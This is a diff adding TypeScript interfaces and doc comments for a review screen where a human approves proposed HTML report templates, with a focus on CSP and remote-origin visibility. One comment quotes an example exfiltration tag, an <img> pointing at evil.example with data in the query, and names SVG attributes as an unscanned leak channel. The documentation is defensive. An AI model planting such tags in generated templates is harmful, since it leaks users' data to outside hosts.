@@ -454,3 +454,67 @@ export type HumanVerdict = "confirmed" | "invalidated";
 
 /** The amendment decision. 🔴 `accept`/`reject` — NOT `accepted`/`rejected` (`amendBody`). */
 export type AmendmentDecision = "accept" | "reject";
+
+// ── W24: the go-live review screen's read ───────────────────────────────
+
+/** One `{ path, message }` from W16's template validator. Same shape as `SpecError`, different owner. */
+export interface TemplateIssue {
+  path: string;
+  message: string;
+}
+
+/**
+ * `GET /api/hypotheses/:id/report-candidate` — the newest `report-candidate`
+ * the hypothesis OWNS, which the go-live review screen approves or refuses.
+ *
+ * 🔴 **`script_srcs` is NOT the set that reaches `script-src`, and calling it
+ * that on screen would be lying to the human approving it.** It is the raw
+ * URL list in document order — `script[src]`, `link[rel=stylesheet][href]`
+ * and CSS `@import` targets — and it is **not https-only**: a CSS
+ * `@import url(data:…)` validates clean and puts a `data:` URL in it, whose
+ * `origin` is the four characters `null` (a HOST NAME in a CSP, not the
+ * keyword `'none'`). `code_origins` is what W19 actually substitutes, derived
+ * server-side by `frame.ts`'s `codeOrigins()` — the browser must not derive
+ * it a second time (R155).
+ *
+ * 🔴 **`remote_origins` is the superset and it is why this screen exists in
+ * revision 5.** A template exfiltrating through
+ * `<img src="https://evil.example/?d=…">` carries no code, appears nowhere in
+ * `script_srcs`, and was approved by a human who never saw the host. Per
+ * **R173** it is what W16's validator SAW, not a guarantee: hosts reached
+ * through SVG `fill`/`filter` are an unscanned channel.
+ *
+ * 🔴 **`html` is here so the accept button can POST it back byte-for-byte,
+ * and for no other reason.** It is never rendered as HTML. The preview comes
+ * from `…/report-candidate/frame`, by URL, so the real CSP header and the
+ * real sandbox apply to it — the same rule `ReportBlock` states from the
+ * other side.
+ */
+export interface ReportCandidate {
+  memory_id: string;
+  /** Line 1: the interview's own summary of what it proposes. */
+  summary: string;
+  /** Everything after line 1: the proposed template fragment, verbatim. */
+  html: string;
+  created_at_ms: UnixMs;
+  /** Provenance, for § 2's `model` stamp. `""` where Orange stamped nothing. */
+  created_by_worker: string;
+  created_by_session: string;
+  /** sha256 of `html`; `null` when the candidate does not validate. */
+  structure_hash: string | null;
+  script_srcs: string[];
+  remote_origins: string[];
+  /** A SUBSET of `remote_origins`, often EQUAL to it — an empty difference is the common case. */
+  code_origins: string[];
+  valid: boolean;
+  errors: TemplateIssue[];
+  tamper: Tamper[];
+}
+
+/** `POST /api/hypotheses/:id/report-template` — 201. */
+export interface ReportTemplateAccepted {
+  structure_hash: string;
+  memory_id: string;
+  remote_origins: string[];
+  script_srcs: string[];
+}
